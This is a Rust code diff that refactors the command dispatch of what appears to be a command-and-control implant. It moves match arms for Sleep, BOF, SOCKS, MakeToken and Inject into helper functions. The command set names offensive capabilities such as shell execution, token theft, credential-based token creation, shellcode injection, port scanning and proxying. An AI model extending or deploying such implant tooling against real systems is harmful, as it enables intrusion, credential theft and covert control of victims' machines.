@@ -2458,25 +2458,13 @@ impl JsonCommand {
         match self {
             Self::Ping => Ok(Command::Ping),
             Self::Shell { args } => Ok(Command::Shell { args }),
-            Self::Sleep {
-                seconds,
-                jitter_pct,
-            } => Ok(into_command_sleep(seconds, jitter_pct)),
+            Self::Sleep { .. } => into_command_sleep_arm(self),
             Self::Upload { name, data_hex } => into_command_upload(name, data_hex),
             Self::Download { path } => Ok(Command::Download { path }),
-            Self::Bof {
-                name,
-                args,
-                data_hex,
-            } => into_command_bof(name, args, data_hex),
+            Self::Bof { .. } => into_command_bof_arm(self),
             Self::FileOp { op, path, dest } => into_command_fileop(op, path, dest),
             Self::Connect { host, port } => Ok(into_command_connect(host, port)),
-            Self::Socks {
-                chan,
-                op,
-                addr,
-                port,
-            } => Ok(into_command_socks(chan, op, addr, port)),
+            Self::Socks { .. } => into_command_socks_arm(self),
             Self::Screenshot { monitor } => Ok(Command::Screenshot { monitor }),
             Self::Portscan { host, ports } => Ok(Command::Portscan { host, ports }),
             Self::Net { query } => Ok(Command::Net { query }),
@@ -2489,25 +2477,84 @@ impl JsonCommand {
             Self::ChannelData { chan, data_hex } => into_command_channel_data(chan, data_hex),
             Self::ChannelClose { chan } => Ok(Command::ChannelClose { chan }),
             Self::StealToken { pid } => Ok(Command::StealToken { pid }),
-            Self::MakeToken {
-                domain,
-                user,
-                password,
-                logon_type,
-            } => Ok(into_command_make_token(domain, user, password, logon_type)),
+            Self::MakeToken { .. } => into_command_make_token_arm(self),
             Self::Rev2Self => Ok(Command::Rev2Self),
             Self::GetUid => Ok(Command::GetUid),
-            Self::Inject {
-                method,
-                pid,
-                spawn_to,
-                sc_hex,
-            } => into_command_inject(method, pid, spawn_to, sc_hex),
+            Self::Inject { .. } => into_command_inject_arm(self),
             Self::Trex => Ok(Command::Trex),
             Self::SetChannel { channel } => Ok(Command::SetChannel { channel }),
             Self::Exit => Ok(Command::Exit),
         }
     }
+}
+
+/// `Sleep` dispatch arm. Routing keeps the dispatch match arms within
+/// rustfmt's single-line pattern width; the let-else guard is defensive
+/// (the only caller routes `Self::Sleep` here).
+fn into_command_sleep_arm(cmd: JsonCommand) -> Result<Command, &'static str> {
+    let JsonCommand::Sleep {
+        seconds,
+        jitter_pct,
+    } = cmd
+    else {
+        return Err("internal: into_command sleep arm misrouted");
+    };
+    Ok(into_command_sleep(seconds, jitter_pct))
+}
+
+/// `Bof` dispatch arm — see `into_command_sleep_arm`.
+fn into_command_bof_arm(cmd: JsonCommand) -> Result<Command, &'static str> {
+    let JsonCommand::Bof {
+        name,
+        args,
+        data_hex,
+    } = cmd
+    else {
+        return Err("internal: into_command bof arm misrouted");
+    };
+    into_command_bof(name, args, data_hex)
+}
+
+/// `Socks` dispatch arm — see `into_command_sleep_arm`.
+fn into_command_socks_arm(cmd: JsonCommand) -> Result<Command, &'static str> {
+    let JsonCommand::Socks {
+        chan,
+        op,
+        addr,
+        port,
+    } = cmd
+    else {
+        return Err("internal: into_command socks arm misrouted");
+    };
+    Ok(into_command_socks(chan, op, addr, port))
+}
+
+/// `MakeToken` dispatch arm — see `into_command_sleep_arm`.
+fn into_command_make_token_arm(cmd: JsonCommand) -> Result<Command, &'static str> {
+    let JsonCommand::MakeToken {
+        domain,
+        user,
+        password,
+        logon_type,
+    } = cmd
+    else {
+        return Err("internal: into_command make_token arm misrouted");
+    };
+    Ok(into_command_make_token(domain, user, password, logon_type))
+}
+
+/// `Inject` dispatch arm — see `into_command_sleep_arm`.
+fn into_command_inject_arm(cmd: JsonCommand) -> Result<Command, &'static str> {
+    let JsonCommand::Inject {
+        method,
+        pid,
+        spawn_to,
+        sc_hex,
+    } = cmd
+    else {
+        return Err("internal: into_command inject arm misrouted");
+    };
+    into_command_inject(method, pid, spawn_to, sc_hex)
 }
 
 /// `Upload` decodes its hex payload here; a malformed hex string is surfaced
